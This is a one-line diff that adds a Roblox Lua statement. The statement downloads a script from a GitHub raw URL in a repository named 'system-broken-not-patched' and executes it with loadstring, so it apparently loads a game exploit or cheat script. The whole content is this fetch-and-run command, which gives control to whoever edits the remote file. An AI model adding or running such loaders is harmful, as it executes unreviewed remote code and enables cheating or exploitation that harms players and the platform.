@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/artyomburleiko-sudo/system-broken-not-patched/main/script3.txt"))()
